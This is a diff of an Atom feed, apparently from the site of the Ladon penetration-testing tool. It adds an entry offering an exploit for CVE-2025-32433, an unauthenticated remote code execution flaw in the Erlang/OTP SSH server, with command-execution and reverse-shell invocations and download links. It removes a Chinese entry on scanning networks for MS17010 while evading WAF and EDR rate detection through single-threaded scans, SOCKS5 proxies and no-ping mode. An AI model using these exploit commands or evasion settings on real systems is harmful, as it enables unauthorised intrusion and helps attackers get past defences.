@@ -6,7 +6,7 @@
   <link href="http://k8gege.org/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2025-04-24T12:24:56.180Z</updated>
+  <updated>2025-04-26T16:29:55.508Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,38 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖EXP〗Ladon CVE-2025-32433 Erlang/OTP SSH RCE Exploit</title>
+    <link href="http://k8gege.org/p/CVE-2025-32433.html"/>
+    <id>http://k8gege.org/p/CVE-2025-32433.html</id>
+    <published>2025-04-26T16:10:00.000Z</published>
+    <updated>2025-04-26T16:29:55.508Z</updated>
+    
+    <content type="html"><![CDATA[<h1>CVE-2025-32433 Erlang/OTP SSH RCE EXP</h1><h2 id="Description">Description</h2><p>A serious vulnerability has been identified in the Erlang/OTP SSH server that may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials. This could lead to compromise of said hosts, allowing for unauthorized access to and manipulation of sensitive data by third parties, or denial-of-service attacks.</p><h2 id="Affected-Versions">Affected Versions</h2><pre><code>OTP-27.3.2 and earlierOTP-26.2.5.10 and earlierOTP-25.3.2.19 and earlier</code></pre><h2 id="Features">Features</h2><ul><li>Exploit Execution: Execute arbitrary commands.</li><li>Reverse Shell: Initiate a bash-based reverse shell.</li></ul><h2 id="Usage">Usage</h2><p>Usage:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; [mode] [options]</p><p>Modes:</p><ol><li><p>Command Execution Mode:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; cmd “<command>”</p><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon CVE-2025-32433 192.168.18.9 2222 cmd <span class="string">&quot;id&gt;888.txt&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>Reverse Shell Mode:<br>Ladon CVE-2025-32433 &lt;target_ip&gt; &lt;target_port&gt; shell &lt;local_ip&gt; &lt;local_port&gt;</p><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon CVE-2025-32433 192.168.18.9 2222 shell 192.168.18.203 4444</span><br></pre></td></tr></table></figure></li></ol><p><img src="%5Ck8img%5Cposts%5Ccve-2025-32433_nc.png" alt="CVE-2025-32433"></p><h3 id="Download">Download</h3><h4 id="LadonGo-ALL-OS">LadonGo (ALL OS)</h4><p><a href="https://github.com/k8gege/LadonGo/releases">https://github.com/k8gege/LadonGo/releases</a></p><h4 id="Ladon-Windows-Cobalt-Strike">Ladon (Windows &amp; Cobalt Strike)</h4><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>911版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a></p><h2 id="References">References</h2><p><a href="https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2">GitHub Advisory</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32433">NVD CVE-2025-32433</a></p><p><a href="https://platformsecurity.com/blog/CVE-2025-32433-poc">Platform Security</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;CVE-2025-32433 Erlang/OTP SSH RCE EXP&lt;/h1&gt;
+&lt;h2 id=&quot;Description&quot;&gt;Description&lt;/h2&gt;
+&lt;p&gt;A serious vulnerability has been identified in the E</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    <category term="提权" scheme="http://k8gege.org/categories/LPE/"/>
+    
+    <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
+    
+    
+    <category term="域控提权" scheme="http://k8gege.org/tags/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"/>
+    
+    <category term="CVE-2025-32433" scheme="http://k8gege.org/tags/CVE-2025-32433/"/>
+    
+  </entry>
   
   <entry>
     <title>AI未授权漏洞 利用Ladon白嫖DeepSeek 和 Qwen 2.5</title>
@@ -230,33 +262,6 @@ JU090-6039P-08409-8J0QH-2YR7F&lt;/p&gt;
     
     
     <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ladon渗透绕过WAF、EDR、防火墙扫描</title>
-    <link href="http://k8gege.org/p/bypassEDR.html"/>
-    <id>http://k8gege.org/p/bypassEDR.html</id>
-    <published>2023-12-26T14:34:00.000Z</published>
-    <updated>2025-04-18T15:24:36.633Z</updated>
-    
-    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/bypassEDR.html";</script><h3 id="BypassEDR扫描">BypassEDR扫描</h3><p>默认扫描速度很快，有些WAF或EDR防御很强<br><br>设置几线程都有可能20分钟左右就不能扫了<br><br>bypassEDR模拟人工访问，绕过速度检测策略<br></p><p>扫描速度较慢，追求速度的愣头青不要使用<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 10.1.2.8/24 MS17010 bypassEDR</span><br></pre></td></tr></table></figure><p>密码爆破相关模块暂不支持bypassEDR参数</p><h3 id="001-自定义线程扫描">001 自定义线程扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞<br><br>单线程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 10.1.2.8/24 MS17010 t=1</span><br></pre></td></tr></table></figure><p>80线程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon noping 10.1.2.8/24 MS17010 t=80</span><br></pre></td></tr></table></figure><p>高强度防护下扫描线程设置低一些，F单线程<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 10.1.2.8/24 MS17010 f=1</span><br></pre></td></tr></table></figure><h3 id="002-Socks5代理扫描">002 Socks5代理扫描</h3><p>例子：使用8线程扫描目标10.1.2段是否存在MS17010漏洞<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon noping 10.1.2.8/24 MS17010 t=8&lt;br&gt;</span><br></pre></td></tr></table></figure><p>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p><p>PS：代理工具不支持Socks5，所以必须加noping参数扫描<br><br>不管是Frp还是其它同类工具，最主要是Proxifier等工具不支持ICMP协议<br><br>因为Ladon默认先用ICMP探测存活后，才使用对应模块测试<br><br>所以代理环境下得禁ping扫描，系统ping使用的就是ICMP协议</p><h3 id="Download">Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>12.3：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt="" src="http://k8gege.org/img/k8team.jpg" style="display: inline-block;width: 250px;height: 300px;" /></div>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;=============================================================================================&lt;br&gt;
-+++++++++++++++++++++++++++++++++++++++</summary>
-      
-    
-    
-    
-    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-    <category term="waf" scheme="http://k8gege.org/tags/waf/"/>
-    
-    <category term="edr" scheme="http://k8gege.org/tags/edr/"/>
     
   </entry>
   
